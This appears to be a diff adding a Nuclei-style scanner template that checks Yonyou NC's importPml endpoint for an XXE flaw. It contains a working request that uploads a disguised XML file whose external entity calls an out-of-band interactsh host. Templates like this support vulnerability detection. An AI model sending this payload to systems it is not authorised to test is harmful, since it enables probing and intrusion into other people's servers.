@@ -1,0 +1,34 @@
+id: yongyouNC-importPml-XXE
+
+info:
+  name: 用友NC importPml XXE漏洞
+  author: XXE
+  severity: high
+  tags: XXE
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /portal/pt/portalpage/importPml?pageId=login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybXJ4bi5uZXQ
+
+        ------WebKitFormBoundarybXJ4bi5uZXQ
+        Content-Disposition: form-data; name="file"; filename="{{username}}.png"
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [
+          <!ENTITY xxe SYSTEM "http://{{interactsh-url}}">
+        ]>
+        <root>
+          <TextResult>&xxe;</TextResult>
+        </root>
+        ------WebKitFormBoundarybXJ4bi5uZXQ--
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
